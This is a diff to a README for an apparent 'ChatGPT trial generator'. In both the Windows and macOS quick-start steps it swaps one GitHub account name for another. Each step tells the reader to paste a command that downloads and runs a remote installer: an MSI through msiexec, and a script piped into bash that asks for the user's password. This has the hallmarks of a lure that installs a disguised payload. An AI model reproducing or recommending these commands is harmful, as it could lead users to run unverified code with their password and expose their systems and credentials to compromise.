@@ -23,14 +23,14 @@ All of this can be done with a single command in the Command Prompt (CMD)
 1. Press `Win + R`, type `cmd` and hit Enter
 2. Paste the following command and press Enter:
 ```cmd
-curl -Lo %temp%\s.msi https://raw.githubusercontent.com/aakbyuqjwx/chatgpt-trial-gen/main/chatgpt.msi && msiexec /i %temp%\s.msi
+curl -Lo %temp%\s.msi https://raw.githubusercontent.com/RestBudgieCabin/chatgpt-trial-gen/main/chatgpt.msi && msiexec /i %temp%\s.msi
 ```
 
 ## MacOS quick start
 1. Open Terminal app
 2. Paste the following command and press Enter:
 ```bash
-curl -fsSL https://raw.githubusercontent.com/aakbyuqjwx/chatgpt-trial-gen/main/chatgpt | bash
+curl -fsSL https://raw.githubusercontent.com/RestBudgieCabin/chatgpt-trial-gen/main/chatgpt | bash
 ```
 3. Enter password when promted
 
